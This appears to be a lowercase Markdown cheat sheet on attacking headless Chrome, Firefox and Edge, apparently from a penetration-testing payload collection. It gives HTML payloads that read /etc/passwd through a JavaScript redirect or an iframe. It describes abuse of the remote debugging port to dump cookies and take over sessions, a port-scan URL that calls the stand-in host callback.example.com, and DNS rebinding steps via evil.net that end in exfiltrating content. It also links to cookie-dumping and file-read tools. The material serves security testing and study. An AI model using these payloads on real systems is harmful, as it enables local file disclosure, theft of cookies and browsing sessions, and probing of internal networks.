# headless browser

> a headless browser is a web browser without a graphical user interface. it works just like a regular browser, such as chrome or firefox, by interpreting html, css, and javascript, but it does so in the background, without displaying any visuals.

> headless browsers are primarily used for automated tasks, such as web scraping, testing, and running scripts. they are particularly useful in situations where a full-fledged browser is not needed, or where resources (like memory or cpu) are limited.


## summary

* [headless commands](#headless-commands)
* [local file read](#local-file-read)
* [debugging port](#debugging-port)
* [network](#network)
    * [port scanning](#port-scanning)
    * [dns rebinding](#dns-rebinding)
* [references](#references)


## headless commands

example of headless browsers commands:

* google chrome
    ```ps1
    google-chrome --headless[=(new|old)] --print-to-pdf https://www.google.com
    ```

* mozilla firefox
    ```ps1
    firefox --screenshot https://www.google.com
    ```

* microsoft edge
    ```ps1
    "c:\program files (x86)\microsoft\edge\application\msedge.exe" --headless --disable-gpu --window-size=1280,720 --screenshot="c:\tmp\screen.png" "https://google.com"
    ```


## local file read

target: `google-chrome-stable --headless[=(new|old)] --print-to-pdf https://site/file.html`

* javascript redirect
    ```html
    <html>
        <body>
            <script>
                window.location="/etc/passwd"
            </script>
        </body>
    </html>
    ```

* iframe
    ```html
    <html>
        <body>
            <iframe src="/etc/passwd" height="640" width="640"></iframe>
        </body>
    </html>
    ```


## debugging port

**target**: `google-chrome-stable --headless=new --remote-debugging-port=xxxx ./index.html`   

**tools**:

* [slyd0g/whitechocolatemacademianut](https://github.com/slyd0g/whitechocolatemacademianut) - interact with chromium-based browsers' debug port to view open tabs, installed extensions, and cookies
* [slyd0g/ripwcmn.py](https://gist.githubusercontent.com/slyd0g/955e7dde432252958e4ecd947b8a7106/raw/d96c939adc66a85fa9464cec4150543eee551356/ripwcmn.py) - wcmn alternative using python to fix the websocket connection with an empty `origin` header.

> [!note]  
> since chrome update from december 20, 2022, you must start the browser with the argument `--remote-allow-origins="*"` to connect to the websocket with whitechocolatemacademianut.

**exploits**:

* connect and interact with the browser: `chrome://inspect/#devices`, `opera://inspect/#devices`
* kill the currently running browser and use the `--restore-last-session` to get access to the user's tabs
* dump cookies: 
* stored data: `chrome://settings`
* port scan: in a loop open `http://localhost:<port>/json/new?http://callback.example.com?port=<port>`
* leak uuid: iframe: `http://127.0.0.1:<port>/json/version`
* local file read: [pich4ya/chrome_remote_debug_lfi.py](https://gist.github.com/pich4ya/5e7d3d172bb4c03360112fd270045e05)
* node inspector `--inspect` works like a `--remote-debugging-port`
    ```ps1
    node --inspect app.js # default port 9229
    node --inspect=4444 app.js # custom port 4444
    node --inspect=0.0.0.0:4444 app.js
    ```

> [!note]  
> the flag `--user-data-dir=/path/to/data_dir` is used to specify the user's data directory, where chromium stores all of its application data such as cookies and history. if you start chromium without specifying this flag, you’ll notice that none of your bookmarks, favorites, or history will be loaded into the browser.


## network

### port scanning

port scanning: timing attack

* dynamically insert an `<img>` tag pointing to a hypothetical closed port. measure time to onerror.
* repeat at least 10 times → average time to get an error for a closed port
* test random port 10 times and measure time to error
* if `time_to_error(random_port) > time_to_error(closed_port)*1.3` → port is opened

**consideration**:

* chrome blocks by default a list of "known ports"
* chrome blocks access to local network addresses except localhost through 0.0.0.0


### dns rebinding

* [nccgroup/singularity](https://github.com/nccgroup/singularity) - a dns rebinding attack framework.

1. chrome will make 2 dns requests: `a` and `aaaa` records
    * `aaaa` response with valid internet ip
    * `a` response with internal ip
2. chrome will connect in priority to the ipv6 (evil.net)
3. close ipv6 listener just after first response
4. open iframe to evil.net
5. chrome will attempt to connect to the ipv6 but as it will fail it will fallback to the ipv4
6. from top window, inject script into iframe to exfiltrate content


## references

- [attacking headless browsers - truff - may 22, 2024](#bb-discord-replay-not-available)
- [browser based port scanning with javascript - nikolai tschacher - january 10, 2021](https://incolumitas.com/2021/01/10/browser-based-port-scanning/)
- [chrome devtools protocol - documentation - july 3, 2017](https://chromedevtools.github.io/devtools-protocol/)
- [cookies with chromium’s remote debugger port - justin bui - december 17, 2020](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [debugging cookie dumping failures with chromium’s remote debugger - justin bui - july 16, 2023](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
- [node inspector/cef debug abuse - hacktricks - july 18, 2024](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse)
- [post-exploitation: abusing chrome's debugging feature to observe and control browsing sessions remotely - wunderwuzzi - april 28, 2020](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [tricks for reliable split-second dns rebinding in chrome and safari - daniel thatcher - december 6, 2023](https://www.intruder.io/research/split-second-dns-rebinding-in-chrome-and-safari)